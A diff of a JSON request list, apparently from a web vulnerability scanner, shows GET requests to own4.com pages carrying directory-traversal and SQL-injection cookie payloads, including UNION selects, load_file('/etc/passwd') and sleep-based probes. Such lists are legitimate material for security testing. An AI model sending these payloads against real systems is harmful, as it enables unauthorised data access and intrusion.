@@ -145,46 +145,6 @@
             "class": "Directory Traversal"
         }, 
         {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "Directory Traversal"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=../;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "Directory Traversal"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..%2F;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "Directory Traversal"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..././;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "Directory Traversal"
-        }, 
-        {
             "url": "https://own4.com/page2.php", 
             "header": {
                 "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
@@ -210,38 +170,6 @@
         }, 
         {
             "url": "https://own4.com/page2.php", 
-            "header": {
-                "Cookie": "Own4Cookie=..././;"
-            }, 
-            "type": "GET", 
-            "class": "Directory Traversal"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
-            }, 
-            "type": "GET", 
-            "class": "Directory Traversal"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=../;"
-            }, 
-            "type": "GET", 
-            "class": "Directory Traversal"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..%2F;"
-            }, 
-            "type": "GET", 
-            "class": "Directory Traversal"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
             "header": {
                 "Cookie": "Own4Cookie=..././;"
             }, 
@@ -281,41 +209,33 @@
             "class": "Directory Traversal"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
             }, 
             "type": "GET", 
             "class": "Directory Traversal"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=../;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=../;"
             }, 
             "type": "GET", 
             "class": "Directory Traversal"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=..%2F;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=..%2F;"
             }, 
             "type": "GET", 
             "class": "Directory Traversal"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=..././;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=..././;"
             }, 
             "type": "GET", 
             "class": "Directory Traversal"
@@ -393,6 +313,38 @@
             "class": "Directory Traversal"
         }, 
         {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
+            }, 
+            "type": "GET", 
+            "class": "Directory Traversal"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=../;"
+            }, 
+            "type": "GET", 
+            "class": "Directory Traversal"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=..%2F;"
+            }, 
+            "type": "GET", 
+            "class": "Directory Traversal"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=..././;"
+            }, 
+            "type": "GET", 
+            "class": "Directory Traversal"
+        }, 
+        {
             "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page11.php", 
             "header": {
                 "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
@@ -460,38 +412,6 @@
                 "Cookie": "Own4Cookie=..././;", 
                 "referer": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/page7.html", 
                 "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "Directory Traversal"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
-            }, 
-            "type": "GET", 
-            "class": "Directory Traversal"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=../;"
-            }, 
-            "type": "GET", 
-            "class": "Directory Traversal"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..%2F;"
-            }, 
-            "type": "GET", 
-            "class": "Directory Traversal"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..././;"
             }, 
             "type": "GET", 
             "class": "Directory Traversal"
@@ -681,6 +601,86 @@
             "class": "Directory Traversal"
         }, 
         {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Directory Traversal"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=../;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Directory Traversal"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=..%2F;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Directory Traversal"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=..././;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Directory Traversal"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Directory Traversal"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=../;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Directory Traversal"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=..%2F;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Directory Traversal"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=..././;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Directory Traversal"
+        }, 
+        {
             "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/page7.html", 
             "header": {
                 "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;", 
@@ -756,38 +756,6 @@
                 "Cookie": "Own4Cookie=..././;", 
                 "referer": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
                 "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "Directory Traversal"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
-            }, 
-            "type": "GET", 
-            "class": "Directory Traversal"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=../;"
-            }, 
-            "type": "GET", 
-            "class": "Directory Traversal"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..%2F;"
-            }, 
-            "type": "GET", 
-            "class": "Directory Traversal"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..././;"
             }, 
             "type": "GET", 
             "class": "Directory Traversal"
@@ -1943,316 +1911,6 @@
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' or 1=1 or ';", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=admin' --;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=admin' #;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=admin'/*;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=/*comment*/;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=/*!32302 1/0, */;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie='; SELECT sleep(10);", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie='1'OR'1';", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=1' OR '1'='1;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=1'or'1;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' or 1=1--;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' or 1=1#;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' or 1=1/*;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=') or '1'='1--;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=') or ('1'='1--;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055';", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie= HAVING 1=1 --;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=1%20and%20 1=1;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union select all 1,2,x,x,x,x \u2014;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union select 1,2,3,x,x,x,x,@@version,x\u2013;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+banner,null,null,null,null+from+v$version\u2013;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+user,null,null,null,null+from+dual\u2013;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+global_name,null,null,null,null+from+global_name\u2013;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+owner,null,null,null,null+from+all_tables\u2013;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+UTL_INADDR.get_host_address,null,null,null,null+from+dual\u2013;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=%27union+select+UTL_INADDR.get_host_name('INTERNALs-IP'),null,null,null,null+from+dual\u2013;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=2+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual);", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=2+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual);", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' and 1 = any (select 1 from users where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=1';select pg_sleep(2); \u2014;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
             "url": "https://own4.com/page2.php", 
             "header": {
                 "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
@@ -2494,254 +2152,6 @@
         }, 
         {
             "url": "https://own4.com/page2.php", 
-            "header": {
-                "Cookie": "Own4Cookie=1';select pg_sleep(2); \u2014;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' or 1=1 or ';"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=admin' --;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=admin' #;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=admin'/*;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=/*comment*/;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=/*!32302 1/0, */;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie='; SELECT sleep(10);"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie='1'OR'1';"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=1' OR '1'='1;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=1'or'1;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' or 1=1--;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' or 1=1#;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' or 1=1/*;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=') or '1'='1--;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=') or ('1'='1--;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055';"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie= HAVING 1=1 --;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=1%20and%20 1=1;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union select all 1,2,x,x,x,x \u2014;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union select 1,2,3,x,x,x,x,@@version,x\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+banner,null,null,null,null+from+v$version\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+user,null,null,null,null+from+dual\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+global_name,null,null,null,null+from+global_name\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+owner,null,null,null,null+from+all_tables\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+UTL_INADDR.get_host_address,null,null,null,null+from+dual\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=%27union+select+UTL_INADDR.get_host_name('INTERNALs-IP'),null,null,null,null+from+dual\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=2+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual);"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=2+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual);"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' and 1 = any (select 1 from users where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
             "header": {
                 "Cookie": "Own4Cookie=1';select pg_sleep(2); \u2014;"
             }, 
@@ -2997,311 +2407,249 @@
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=' or 1=1 or ';", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=' or 1=1 or ';"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
